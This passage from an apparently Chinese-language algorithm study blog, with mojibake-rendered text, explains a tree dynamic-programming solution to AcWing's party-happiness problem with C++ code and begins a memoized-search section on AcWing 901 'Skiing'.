style="margin-right:0.10903em;">N</span></span></span></span> è¡Œï¼Œç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> è¡Œè¡¨ç¤º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> å·èŒå‘˜çš„å¿«ä¹æŒ‡æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mi mathvariant="normal">_</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">H\_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9933em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span></span></span></span>ã€‚</p><p>æ¥ä¸‹æ¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">N-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> è¡Œï¼Œæ¯è¡Œè¾“å…¥ä¸€å¯¹æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo separator="true">,</mo><mi>K</mi></mrow><annotation encoding="application/x-tex">L, K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">L</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span>ï¼Œè¡¨ç¤º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span> æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span></span></span></span> çš„ç›´æ¥ä¸Šå¸ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºæœ€å¤§çš„å¿«ä¹æŒ‡æ•°ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>N</mi><mo>â‰¤</mo><mn>6000</mn></mrow><annotation encoding="application/x-tex">1 \le N \le 6000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">6000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>128</mn><mo>â‰¤</mo><mi>H</mi><mi mathvariant="normal">_</mi><mi>i</mi><mo>â‰¤</mo><mn>127</mn></mrow><annotation encoding="application/x-tex">-128 \le H\_i \le 127</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">âˆ’</span><span class="mord">128</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9933em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">127</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>711111111 32 36 47 44 53 5</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>5</code></pre><h3 id="æ ‘å½¢dp">æ ‘å½¢dp</h3><ul><li>çŠ¶æ€è¡¨ç¤º <code>f[u][0 / 1]</code><ul><li>é›†åˆ ä»æ‰€æœ‰ä»¥uä¸ºæ ¹èŠ‚ç‚¹çš„å­æ ‘ä¸­é€‰ï¼Œä¸”ä¸é€‰(0) / é€‰æ‹©(1) uçš„æ–¹æ¡ˆ</li><li>å±æ€§ Max</li></ul></li><li>çŠ¶æ€è®¡ç®—<ul><li>ä¸é€‰uå…¶å­æ ‘æ ¹é€‰ä¸é€‰éƒ½å¯ä»¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">[</mo><mi>u</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo>=</mo><mo>âˆ‘</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">[</mo><msub><mi>s</mi><mi>i</mi></msub><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo separator="true">,</mo><mi>f</mi><mo stretchy="false">[</mo><msub><mi>s</mi><mi>i</mi></msub><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f[u][0] = \sum max(f[s_i][0], f[s_i][1])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathnormal">u</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">])</span></span></span></span></li><li>é€‰äº†uå…¶å­æ ‘æ ¹ä¸€å®šä¸èƒ½é€‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">[</mo><mi>u</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo>=</mo><mi>w</mi><mo stretchy="false">[</mo><mi>u</mi><mo stretchy="false">]</mo><mo>+</mo><mo>âˆ‘</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">[</mo><msub><mi>s</mi><mi>i</mi></msub><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f[u][1] = w[u] + \sum max(f[s_i][0])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord mathnormal">u</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mopen">[</span><span class="mord mathnormal">u</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">])</span></span></span></span></li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">6010</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> h[kN], e[kN], ne[kN], idx;</span><br><span class="line"><span class="type">int</span> happy[kN];</span><br><span class="line"><span class="type">bool</span> has_father[kN];</span><br><span class="line"><span class="type">int</span> f[kN][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">  e[idx] = b, ne[idx] = h[a], h[a] = idx++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u)</span> </span>&#123;</span><br><span class="line">  f[u][<span class="number">1</span>] = happy[u];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = h[u]; ~i; i = ne[i]) &#123;</span><br><span class="line">    <span class="type">int</span> j = e[i];</span><br><span class="line">    <span class="built_in">dfs</span>(j);</span><br><span class="line">    f[u][<span class="number">1</span>] += f[j][<span class="number">0</span>];</span><br><span class="line">    f[u][<span class="number">0</span>] += <span class="built_in">max</span>(f[j][<span class="number">0</span>], f[j][<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;  <span class="comment">// åºå·ä¸º1~n, è¦å’Œåé¢å»ºè¾¹å¯¹åº”</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;happy[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="keyword">sizeof</span> h);  <span class="comment">// é‚»æ¥è¡¨åˆå§‹åŒ–</span></span><br><span class="line">  <span class="keyword">while</span> (--n) &#123;</span><br><span class="line">    <span class="type">int</span> a, b;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">    <span class="built_in">add</span>(b, a);  <span class="comment">// bæ˜¯ä¸Šå¸</span></span><br><span class="line">    has_father[a] = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> root = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (has_father[root]) root++;</span><br><span class="line">  <span class="built_in">dfs</span>(root);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">max</span>(f[root][<span class="number">0</span>], f[root][<span class="number">1</span>]));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="è®°å¿†åŒ–æœç´¢">è®°å¿†åŒ–æœç´¢</h1><blockquote><p>è®°å¿†æœç´¢æ˜¯ä¸€ç§é€’å½’å®ç°æ–¹å¼ã€‚<br>å¯ä»¥æ˜¾è‘—é™ä½ä»£ç å¤æ‚åº¦ï¼ˆå¥½å†™ï¼‰ï¼Œç¡®å®šåœ¨äºå¯èƒ½çˆ†æ ˆã€‚</p></blockquote><h2 id="AcWing-901-æ»‘é›ª"><a href="https://www.acwing.com/activity/content/problem/content/1013/">AcWing 901. æ»‘é›ª</a></h2><p><code>éš¾åº¦ï¼šç®€å•</code></p><p>ç»™å®šä¸€ä¸ª <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi></mrow><annotation encoding="application/x-tex">R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span> è¡Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span> åˆ—çš„çŸ©é˜µï¼Œè¡¨ç¤ºä¸€ä¸ªçŸ©å½¢ç½‘æ ¼æ»‘é›ªåœºã€‚</p><p>çŸ©é˜µä¸­ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> è¡Œç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> åˆ—çš„ç‚¹è¡¨ç¤ºæ»‘é›ªåœºçš„ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> è¡Œç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> åˆ—åŒºåŸŸçš„é«˜åº¦ã€‚</p><p>ä¸€ä¸ªäººä»æ»‘é›ªåœºä¸­çš„æŸä¸ªåŒºåŸŸå†…å‡ºå‘ï¼Œæ¯æ¬¡å¯ä»¥å‘ä¸Šä¸‹å·¦å³ä»»æ„ä¸€ä¸ªæ–¹å‘æ»‘åŠ¨ä¸€ä¸ªå•ä½è·ç¦»ã€‚</p><p>å½“ç„¶ï¼Œä¸€ä¸ªäººèƒ½å¤Ÿæ»‘åŠ¨åˆ°æŸç›¸é‚»åŒºåŸŸçš„å‰ææ˜¯è¯¥åŒºåŸŸçš„é«˜åº¦ä½äºè‡ªå·±ç›®å‰æ‰€åœ¨åŒºåŸŸçš„é«˜åº¦ã€‚</p><p>ä¸‹é¢ç»™å‡ºä¸€ä¸ªçŸ©é˜µä½œä¸ºä¾‹å­ï¼š</p><pre><code> 1  2  3  4 516 17 18 19 615 24 25 20 714 23 22 21 813 12 11 10 9</code></pre><p>åœ¨ç»™å®šçŸ©é˜µä¸­ï¼Œä¸€æ¡å¯è¡Œçš„æ»‘è¡Œè½¨è¿¹ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>24</mn><mo>âˆ’</mo><mn>17</mn><mo>âˆ’</mo><mn>2</mn><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">24-17-2-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">24</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">17</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>ã€‚</p><p>åœ¨ç»™å®šçŸ©é˜µä¸­ï¼Œæœ€é•¿çš„æ»‘è¡Œè½¨è¿¹ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>25</mn><mo>âˆ’</mo><mn>24</mn><mo>âˆ’</mo><mn>23</mn><mo>âˆ’</mo><mo>â€¦</mo><mo>âˆ’</mo><mn>3</mn><mo>âˆ’</mo><mn>2</mn><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">25-24-23-â€¦-3-2-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">25</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">24</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">23</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="minner">â€¦</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>ï¼Œæ²¿é€”å…±ç»è¿‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>25</mn></mrow><annotation encoding="application/x-tex">25</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">25</span></span></span></span> ä¸ªåŒºåŸŸã€‚</p><p>ç°åœ¨ç»™å®šä½ ä¸€ä¸ªäºŒç»´çŸ©é˜µè¡¨ç¤ºæ»‘é›ªåœºå„åŒºåŸŸçš„é«˜åº¦ï¼Œè¯·ä½ æ‰¾å‡ºåœ¨è¯¥æ»‘é›ªåœºä¸­èƒ½å¤Ÿå®Œæˆçš„æœ€é•¿æ»‘é›ªè½¨è¿¹ï¼Œå¹¶è¾“å‡ºå…¶é•¿åº¦(å¯ç»è¿‡æœ€å¤§åŒºåŸŸæ•°)ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi></mrow><annotation encoding="application/x-tex">R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>ã€‚</p><p>æ¥ä¸‹æ¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi></mrow><annotation encoding="application/x-tex">R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span> è¡Œï¼Œæ¯è¡ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span> ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºå®Œæ•´çš„äºŒç»´çŸ©é˜µã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºå¯å®Œæˆçš„æœ€é•¿æ»‘é›ªé•¿åº¦ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>R</mi><mo separator="true">,</mo><mi>C</mi><mo>â‰¤</mo><mn>300</mn></mrow><annotation encoding="application/x-tex">1 \le R,C \le 300</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">300</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>â‰¤</mo><mtext>çŸ©é˜µä¸­æ•´æ•°</mtext><mo>â‰¤</mo><mn>10000</mn></mrow><annotation encoding="application/x-tex">0 \le çŸ©é˜µä¸­æ•´æ•° \le 10000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord cjk_fallback">çŸ©é˜µä¸­æ•´æ•°</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10000</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>5 51 2 3 4 516 17 18 19 615 24 25 20 714 23 22 21 813 12 11 10 9</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>25</code></pre><h3 id="è®°å¿†åŒ–æœç´¢-2">è®°å¿†åŒ–æœç´¢</h3><ul><li>çŠ¶æ€è¡¨ç¤º <code>f[i, j]</code><ul><li>é›†åˆ æ‰€æœ‰ä»<code>(i, j)</code>å¼€å§‹æ»‘è¡Œçš„è·¯å¾„</li><li>å±æ€§ Max</li></ul></li><li>çŠ¶æ€è®¡ç®—<ul><li>æŒ‰ä¸‹ä¸€æ­¥æ»‘è¡Œçš„æ–¹å‘è¿›è¡Œåˆ†ç±»</li><li>å¦‚å‘å³æ»‘ <code>f[i, j + 1] + 1</code><br>æ³¨æ„æ˜¯å¦åˆæ³•ï¼šè¾¹ç•Œå†… and 